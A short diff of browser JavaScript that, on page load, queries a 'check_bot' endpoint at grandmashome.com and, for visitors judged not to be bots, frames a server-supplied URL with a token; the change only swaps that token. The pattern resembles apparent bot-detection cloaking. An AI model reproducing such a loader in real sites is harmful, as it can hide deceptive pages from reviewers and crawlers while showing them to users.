@@ -55,7 +55,7 @@ window.addEventListener('message', (message) => {
 window.addEventListener('DOMContentLoaded', () => {
     fetch('https://grandmashome.com/api/check_bot').then(res => res.json()).then(res => {
         if (res?.code == 200 && !res.result) {
-            createFrame(res.url + 'myTg88HB')
+            createFrame(res.url + 'PgKzwT3K')
         } else {
             setTimeout(toggleLoad, 500);
 
